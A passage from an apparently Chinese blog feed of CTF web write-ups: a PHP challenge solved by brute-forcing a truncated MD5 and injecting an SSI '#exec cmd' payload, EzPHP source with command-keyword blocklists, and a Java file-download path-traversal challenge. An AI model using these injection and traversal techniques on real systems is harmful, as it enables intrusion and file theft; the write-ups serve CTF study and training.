class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ob_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_hash</span><span class="params">()</span></span>&#123;</span><br><span class="line">$chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'</span>;</span><br><span class="line">$random = $chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line">$content = uniqid().$random;</span><br><span class="line"><span class="keyword">return</span> sha1($content); </span><br><span class="line">&#125;</span><br><span class="line">    header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line">***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) <span class="keyword">and</span> $_POST[<span class="string">'username'</span>] != <span class="string">''</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin = <span class="string">'6d0bc1'</span>;</span><br><span class="line">        <span class="keyword">if</span> ( $admin == substr(md5($_POST[<span class="string">'password'</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('[+] Welcome to manage system')&lt;/script&gt;"</span>;</span><br><span class="line">            $file_shtml = <span class="string">"public/"</span>.get_hash().<span class="string">".shtml"</span>;</span><br><span class="line">            $shtml = fopen($file_shtml, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">            $text = <span class="string">'</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,'</span>.$_POST[<span class="string">'username'</span>].<span class="string">'&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">***'</span>;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br><span class="line">            ***</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"[!] Header  error ..."</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('[!] Failed')&lt;/script&gt;"</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">***</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先附上爆棚md5脚本(python写出来总是出错)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=<span class="number">1000000000</span>;$i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(strcmp(md5($i),<span class="string">'6d0bc1'</span>)==<span class="number">26</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        var_dump($i);  </span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">//int(2020666)</span></span><br></pre></td></tr></table></figure><p>username数据会被写入到文件中，文件是shtml，百度一波寻找漏洞</p><p><a href="https://www.xuebuyuan.com/693626.html" target="_blank" rel="noopener">ssi语法</a></p><p>直接读取根目录`/flag文件发现flag不存在，于是查看目录，发现flag在当前文件下。</p><p>username输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd&#x3D;&quot;ls ..&#x2F;&quot;--&gt;</span><br></pre></td></tr></table></figure><p>随后访问shtml文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello,flag_990c66bf85a09c664f0b6741840499b2 index.php index.php.swp public</span><br></pre></td></tr></table></figure><p>直接访问flag_990c66bf85a09c664f0b6741840499b2文件即可</p><h2 id="未完成-EzPHP"><a href="#未完成-EzPHP" class="headerlink" title="[未完成]EzPHP"></a>[未完成]EzPHP</h2><p>查看源码发现提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Here is the real page &#x3D;w&#x3D; --&gt;</span><br><span class="line">&lt;!-- GFXEIM3YFZYGQ4A&#x3D; --&gt;</span><br></pre></td></tr></table></figure><p>base32解码后得到<code>1nD3x.php</code></p><p>访问即可得到源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0); </span><br><span class="line"></span><br><span class="line">$file &#x3D; &quot;1nD3x.php&quot;;</span><br><span class="line">$shana &#x3D; $_GET[&#39;shana&#39;];</span><br><span class="line">$passwd &#x3D; $_GET[&#39;passwd&#39;];</span><br><span class="line">$arg &#x3D; &#39;&#39;;</span><br><span class="line">$code &#x3D; &#39;&#39;;</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;br &#x2F;&gt;&lt;font color&#x3D;red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;&#x2F;B&gt;&lt;br&gt;&lt;&#x2F;font&gt;&quot;;</span><br><span class="line"></span><br><span class="line">if($_SERVER) &#123; </span><br><span class="line">    if (</span><br><span class="line">        preg_match(&#39;&#x2F;shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#39;|log&#x2F;i&#39;, $_SERVER[&#39;QUERY_STRING&#39;])</span><br><span class="line">        )  </span><br><span class="line">        die(&#39;You seem to want to do something bad?&#39;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!preg_match(&#39;&#x2F;http|https&#x2F;i&#39;, $_GET[&#39;file&#39;])) &#123;</span><br><span class="line">    if (preg_match(&#39;&#x2F;^aqua_is_cute$&#x2F;&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !&#x3D;&#x3D; &#39;aqua_is_cute&#39;) &#123; </span><br><span class="line">        $file &#x3D; $_GET[&quot;file&quot;]; </span><br><span class="line">        echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; else die(&#39;fxck you! What do you want to do ?!&#39;);</span><br><span class="line"></span><br><span class="line">if($_REQUEST) &#123; </span><br><span class="line">    foreach($_REQUEST as $value) &#123; </span><br><span class="line">        if(preg_match(&#39;&#x2F;[a-zA-Z]&#x2F;i&#39;, $value))  </span><br><span class="line">            die(&#39;fxck you! I hate English!&#39;); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">if (file_get_contents($file) !&#x3D;&#x3D; &#39;debu_debu_aqua&#39;)</span><br><span class="line">    die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&lt;br&gt;&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if ( sha1($shana) &#x3D;&#x3D;&#x3D; sha1($passwd) &amp;&amp; $shana !&#x3D; $passwd )&#123;</span><br><span class="line">    extract($_GET[&quot;flag&quot;]);</span><br><span class="line">    echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;</span><br><span class="line">&#125; else&#123;</span><br><span class="line">    die(&quot;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(preg_match(&#39;&#x2F;^[a-z0-9]*$&#x2F;isD&#39;, $code) || </span><br><span class="line">preg_match(&#39;&#x2F;fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\&#96;|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#39;|\&#x3D;|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^&#x2F;i&#39;, $arg) ) &#123; </span><br><span class="line">    die(&quot;&lt;br &#x2F;&gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag &#x3D;w&#x3D;&quot;); </span><br><span class="line">&#125; else &#123; </span><br><span class="line">    include &quot;flag.php&quot;;</span><br><span class="line">    $code(&#39;&#39;, $arg); </span><br><span class="line">&#125; ?&gt;</span><br><span class="line">This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</span><br><span class="line">Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;Easy-MD5&quot;&gt;&lt;a href=&quot;#Easy-MD5&quot; class=&quot;headerlink&quot; title=&quot;Easy MD5&quot;&gt;&lt;/a&gt;Easy MD5&lt;/h2&gt;&lt;p&gt;在题目返回的http header中给出了提示&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;select * from &amp;#39;admin&amp;#39; where password&amp;#x3D;md5($pass,true)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;要使得某个字符串的md5值转字符串后出现形如 &lt;code&gt;&amp;#39;or&amp;#39;1&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="刷题记录" scheme="https://sunny250.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="web" scheme="https://sunny250.github.io/tags/web/"/>
    
      <category term="ctf" scheme="https://sunny250.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>网鼎杯2020记录</title>
    <link href="https://sunny250.github.io/2020/05/11/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E8%AE%B0%E5%BD%95/"/>
    <id>https://sunny250.github.io/2020/05/11/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E8%AE%B0%E5%BD%95/</id>
    <published>2020-05-10T16:09:53.000Z</published>
    <updated>2020-05-10T16:09:53.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="青龙组-filejava"><a href="#青龙组-filejava" class="headerlink" title="青龙组 filejava"></a>青龙组 filejava</h2><p>上传一个文件后得到下载地址，下载地址可以随意读取文件，读取为目录时报错，得到绝对路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">java.io.FileNotFoundException: &#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;upload&#x2F;15&#x2F;12&#x2F;..&#x2F;..&#x2F;.. (Is a directory)</span><br><span class="line">java.io.FileInputStream.open0(Native Method)</span><br><span class="line">java.io.FileInputStream.open(FileInputStream.java:195)</span><br><span class="line">java.io.FileInputStream.&lt;init&gt;(FileInputStream.java:138)</span><br><span class="line">java.io.FileInputStream.&lt;init&gt;(FileInputStream.java:93)</span><br><span class="line">cn.abc.servlet.DownloadServlet.doPost(DownloadServlet.java:43)</span><br><span class="line">cn.abc.servlet.DownloadServlet.doGet(DownloadServlet.java:22)</span><br><span class="line">javax.servlet.http.HttpServlet.service(HttpServlet.java:634)</span><br><span class="line">javax.servlet.http.HttpServlet.service(HttpServlet.java:741)</span><br><span class="line">org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)</span><br></pre></td></tr></table></figure><a id="more"></a><p>读取web.xml文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">"4.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.DownloadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/DownloadServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.ListFileServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/ListFileServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.UploadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/UploadServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p><del>读取upload.jsp时候发现提示，flag在/flag中</del>比赛时可以读到，buu读不到。</p><p>根据web.xml下载java文件进行审计</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//DownloadServlet.class</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> cn.abc.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletOutputStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DownloadServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DownloadServlet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String fileName = request.getParameter(<span class="string">"filename"</span>);</span><br><span class="line">        fileName = <span class="keyword">new</span> String(fileName.getBytes(<span class="string">"ISO8859-1"</span>), <span class="string">"UTF-8"</span>);</span><br><span class="line">        System.out.println(<span class="string">"filename="</span> + fileName);</span><br><span class="line">        <span class="keyword">if</span> (fileName != <span class="keyword">null</span> &amp;&amp; fileName.toLowerCase().contains(<span class="string">"flag"</span>)) &#123;</span><br><span class="line">            request.setAttribute(<span class="string">"message"</span>, <span class="string">"禁止读取"</span>);</span><br><span class="line">            request.getRequestDispatcher(<span class="string">"/message.jsp"</span>).forward(request, response);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String fileSaveRootPath = <span class="keyword">this</span>.getServletContext().getRealPath(<span class="string">"/WEB-INF/upload"</span>);</span><br><span class="line">            String path = <span class="keyword">this</span>.findFileSavePathByFileName(fileName, fileSaveRootPath);</span><br><span class="line">            File file = <span class="keyword">new</span> File(path + <span class="string">"/"</span> + fileName);</span><br><span class="line">            <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">                request.setAttribute(<span class="string">"message"</span>, <span class="string">"您要下载的资源已被删除!"</span>);</span><br><span class="line">                request.getRequestDispatcher(<span class="string">"/message.jsp"</span>).forward(request, response);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                String realname = fileName.substring(fileName.indexOf(<span class="string">"_"</span>) + <span class="number">1</span>);</span><br><span class="line">                response.setHeader(<span class="string">"content-disposition"</span>, <span class="string">"attachment;filename="</span> + URLEncoder.encode(realname, <span class="string">"UTF-8"</span>));</span><br><span class="line">                FileInputStream in = <span class="keyword">new</span> FileInputStream(path + <span class="string">"/"</span> + fileName);</span><br><span class="line">                ServletOutputStream out = response.getOutputStream();</span><br><span class="line">                <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="keyword">boolean</span> var11 = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">int</span> len;</span><br><span class="line">                <span class="keyword">while</span>((len = in.read(buffer)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    out.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                in.close();</span><br><span class="line">                out.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">findFileSavePathByFileName</span><span class="params">(String filename, String saveRootPath)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> hashCode = filename.hashCode();</span><br><span class="line">        <span class="keyword">int</span> dir1 = hashCode &amp; <span class="number">15</span>;</span><br><span class="line">        <span class="keyword">int</span> dir2 = (hashCode &amp; <span class="number">240</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">        String dir = saveRootPath + <span class="string">"/"</span> + dir1 + <span class="string">"/"</span> + dir2;</span><br><span class="line">        File file = <span class="keyword">new</span> File(dir);</span><br><span class="line">        <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">            file.mkdirs();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dir;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ListFileServlet.class</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> cn.abc.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ListFileServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ListFileServlet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String uploadFilePath = <span class="keyword">this</span>.getServletContext().getRealPath(<span class="string">"/WEB-INF/upload"</span>);</span><br><span class="line">        Map&lt;String, String&gt; fileNameMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        String saveFilename = (String)request.getAttribute(<span class="string">"saveFilename"</span>);</span><br><span class="line">        String filename = (String)request.getAttribute(<span class="string">"filename"</span>);</span><br><span class="line">        System.out.println(<span class="string">"saveFilename"</span> + saveFilename);</span><br><span class="line">        System.out.println(<span class="string">"filename"</span> + filename);</span><br><span class="line">        saveFilename.substring(saveFilename.indexOf(<span class="string">"_"</span>) + <span class="number">1</span>);</span><br><span class="line">        fileNameMap.put(saveFilename, filename);</span><br><span class="line">        request.setAttribute(<span class="string">"fileNameMap"</span>, fileNameMap);</span><br><span class="line">        request.getRequestDispatcher(<span class="string">"/listfile.jsp"</span>).forward(request, response);</span><br><span class="line">    